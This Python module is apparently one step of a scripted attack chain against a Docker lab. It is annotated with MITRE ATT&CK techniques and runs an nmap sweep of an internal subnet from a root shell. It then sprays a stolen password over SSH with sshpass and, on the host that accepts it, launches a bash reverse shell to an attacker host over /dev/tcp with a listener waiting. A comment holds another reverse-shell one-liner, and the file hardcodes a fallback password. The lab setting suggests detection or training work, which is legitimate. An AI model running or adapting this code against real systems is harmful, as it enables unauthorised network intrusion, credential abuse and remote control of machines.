import re
import shlex
import socket
import threading
import time

from chainlog import drain, log, run_remote, send_command

# =============================================================================
# lateral_movement.py — Network Discovery + Credential Stuffing + SSH Pivot
# MITRE ATT&CK:
#   T1018     – Remote System Discovery   (nmap sweep of internal_net)
#   T1046     – Network Service Discovery  (ssh service enumeration)
#   T1110.004 – Brute Force: Credential Stuffing  (reuse john's password on all hosts)
#   T1021.004 – Remote Services: SSH       (password-auth SSH to john's workstation)
#   T1078     – Valid Accounts             (reuse of john.stravidis identity)
# -----------------------------------------------------------------------------
# All phases execute FROM apache via the root reverse shell.
#
# Phase 1 — NMAP scan of internal_net to find live SSH hosts.
# Phase 2 — Credential stuffing: spray john's password across all discovered
#            hosts.  Only john's workstation accepts it; luke's and vinzenz's
#            deny it — generating T1110 auth.log artefacts on those boxes.
# Phase 3 — Successful lateral move to john's workstation via password-auth SSH
#            reverse shell back to kali.
# Phase 4 — Confirm identity via 'id'.
#
# Note: john.stravidis has a deploy key at /home/john.stravidis/.ssh/id_ed25519
# on Apache — theoretical SSH access back to Apache, not used in this chain.
# =============================================================================

KALI_HOST        = "10.10.0.2"
WORKSTATION_IP   = "10.30.0.5"
WORKSTATION_USER = "john.stravidis"
WORKSTATION_PORT = 22
PORT_JOHN        = 6666

INTERNAL_SUBNET  = "10.30.0.0/24"
SSH_PORT         = 22
SCAN_OUTPUT_FILE = "/tmp/lm-scan.gnmap"

# Fallback password used when the credential_access step was skipped (--only lateral).
_FALLBACK_PASSWORD = "waystar2026!"

# Pure infrastructure addresses with no user sshd worth spraying:
#   .1   bridge gateway     .2   apache (we are already root here)
#   .3   router public leg  .4   router internal leg
#   .6   db-internal (postgres only, no sshd)
_SKIP_HOSTS = {"10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4", "10.30.0.6"}

# Fallback spray targets used when NMAP discovers no non-john hosts.
_FALLBACK_SPRAY_TARGETS = ["10.30.0.7", "10.30.0.8"]




def _parse_gnmap_hosts(gnmap_text):
    """Return a list of IPs whose grepable-nmap line shows port 22/open."""
    hosts = []
    for line in gnmap_text.splitlines():
        if not line.startswith("Host:"):
            continue
        if "22/open" not in line:
            continue
        m = re.search(r"Host:\s+(\S+)", line)
        if m:
            hosts.append(m.group(1))
    return hosts


def _try_password(root_shell, ip, user, pwd, port):
    """Attempt SSH with a single password via sshpass. Returns (success, output)."""
    cmd = (
        f"sshpass -p {shlex.quote(pwd)} ssh "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o PasswordAuthentication=yes "
        f"-o PubkeyAuthentication=no "
        f"-o PreferredAuthentications=password "
        f"-o NumberOfPasswordPrompts=1 "
        f"-o ConnectTimeout=5 "
        f"-p {port} "
        f"{user}@{ip} id 2>&1"
    )
    out = run_remote(root_shell, cmd, timeout=12)
    return ("uid=" in out and user in out), out


def _denial_reason(out):
    """Classify an SSH auth failure output into a short human-readable reason."""
    if "Permission denied" in out or "publickey" in out:
        return "permission denied"
    if "Connection refused" in out:
        return "connection refused"
    last_line = out.splitlines()[-1] if out else ""
    return last_line or "no response"


def _log_spray_result(ip, user, success, out, workstation_ip):
    """Log a single credential-stuffing attempt outcome."""
    if ip == workstation_ip:
        if success:
            log(f"[+] {ip:<14} {user}  → AUTH OK  (john's workstation)")
        else:
            log(f"[-] {ip:<14} {user}  → {_denial_reason(out)}  "
                f"(expected success on john's workstation)")
    elif success:
        log(f"[!] {ip:<14} {user}  → AUTH OK (unexpected)")
    else:
        log(f"[-] {ip:<14} {user}  → {_denial_reason(out)}")


def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
                        workstation_port, kali_host, kali_port, password):
    """
    SSH from apache to workstation using john's password and trigger a reverse
    bash shell back to kali.  Runs in a background thread.
    """
    ssh_cmd = (
        f"sshpass -p {shlex.quote(password)} ssh "
        f"-o StrictHostKeyChecking=accept-new "
        f"-o UserKnownHostsFile=/dev/null "
        f"-o PasswordAuthentication=yes "
        f"-o PubkeyAuthentication=no "
        f"-o PreferredAuthentications=password "
        f"-o ConnectTimeout=5 "
        f"-p {workstation_port} "
        f"{workstation_user}@{workstation_ip} "
        f'"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1" '
        f">/dev/null 2>&1 &"
    )
    send_command(root_shell, ssh_cmd)


def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT,
        john_password=None):
    """
    Execute the full lateral-movement step: NMAP discovery, credential stuffing
    (john's password) across all discovered hosts, then pivot to john's workstation.

    Args:
        root_shell (socket):    root shell on apache (from privesc step).
        kali_host (str):        kali IP for reverse-shell callback.
        workstation_ip (str):   john's workstation IP (used to identify the
                                successful target and trigger the reverse shell).
        workstation_user (str): SSH username on john's workstation.
        workstation_port (int): SSH port on all targets.
        john_password (str):    john's password from the credential_access step;
                                falls back to _FALLBACK_PASSWORD when running standalone.

    Returns:
        dict with:
            john_shell                       — socket (or None on failure)
            failed_lateral_targets           — IPs where auth was denied
            failed_lateral_password_failures — (ip, pwd) pairs that were denied
    """
    log("\n[*] Starting lateral movement to workstation...")

    if john_password is None:
        log("[!] No password from credential_access step — using fallback (run credential_access first for accurate results)")
        john_password = _FALLBACK_PASSWORD

    # ------------------------------------------------------------------
    # Phase 1 — NMAP scan (T1018 / T1046)
    # ------------------------------------------------------------------
    log(f"[*] Scanning {INTERNAL_SUBNET} for live SSH hosts (nmap from apache)...")
    scan_cmd = (
        f"nmap -Pn -n -p {SSH_PORT} --open "
        f"-oG {SCAN_OUTPUT_FILE} {INTERNAL_SUBNET} >/dev/null && "
        f"cat {SCAN_OUTPUT_FILE}"
    )
    scan_out = run_remote(root_shell, scan_cmd, timeout=60)
    run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")

    discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
    if not discovered:
        log(f"[-] No SSH hosts discovered on {INTERNAL_SUBNET} — using fallback targets")
        discovered = [workstation_ip] + list(_FALLBACK_SPRAY_TARGETS)
    else:
        log(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")

    # ------------------------------------------------------------------
    # Phase 2 — Credential stuffing (T1110.004 / T1078)
    # Try john's password on every discovered host in NMAP order.
    # Only john's workstation is expected to accept it.
    # ------------------------------------------------------------------
    log(f"\n[*] Credential stuffing {workstation_user}'s password across "
        f"{len(discovered)} host(s)...")
    password_failures: list[tuple[str, str]] = []

    for ip in discovered:
        success, out = _try_password(root_shell, ip, workstation_user,
                                     john_password, workstation_port)
        _log_spray_result(ip, workstation_user, success, out, workstation_ip)
        if not success and ip != workstation_ip:
            password_failures.append((ip, john_password))
        time.sleep(0.3)

    failed_targets = [ip for ip, _ in password_failures]
    log(f"\n[*] Credential stuffing complete — {len(password_failures)} host(s) denied access")

    # ------------------------------------------------------------------
    # Phase 3 — Set up listener and trigger reverse shell (T1021.004)
    # ------------------------------------------------------------------
    log(f"\n[*] Pivoting to john's workstation at "
        f"{workstation_user}@{workstation_ip}...")

    john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    john_server.bind(("0.0.0.0", PORT_JOHN))
    john_server.listen(1)
    log(f"[*] Waiting for {workstation_user} shell on port {PORT_JOHN}...")

    t = threading.Thread(
        target=_fire_reverse_shell,
        args=(root_shell, workstation_user, workstation_ip,
              workstation_port, kali_host, PORT_JOHN, john_password),
        daemon=True,
    )
    t.start()

    john_server.settimeout(20)
    try:
        john_shell, addr = john_server.accept()
        log(f"[+] Shell received from {addr[0]}")
    except socket.timeout:
        log("[-] Timeout — no shell received from workstation")
        log("    → check workstation can reach kali: route -n")
        log("    → verify ssh manually: sshpass -p '<password>' ssh "
            f"{workstation_user}@{workstation_ip}")
        return {"john_shell": None, "failed_lateral_targets": failed_targets,
                "failed_lateral_password_failures": password_failures}
    finally:
        john_server.close()

    # ------------------------------------------------------------------
    # Phase 4 — Confirm identity
    # ------------------------------------------------------------------
    time.sleep(1)
    drain(john_shell, timeout=2.0)  # flush shell banner before first sentinel-based command
    response = run_remote(john_shell, "id", timeout=10)

    if workstation_user in response:
        log("[+] Lateral movement successful!")
        log(f"[+] {response.strip()}")
    else:
        log("[-] User not confirmed in id output")
        log(f"[?] Response: {response!r}")

    return {
        "john_shell": john_shell,
        "failed_lateral_targets": failed_targets,
        "failed_lateral_password_failures": password_failures,
    }


# Test mode — not executed when imported by main.py.
# Usage: docker compose exec kali python3 /Attack-chain/lateral_movement.py
# Then in another terminal:
#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
if __name__ == "__main__":
    log("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        log(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    log(f"\n[*] Result: {'success — john.stravidis shell active' if result['john_shell'] else 'failed'}")
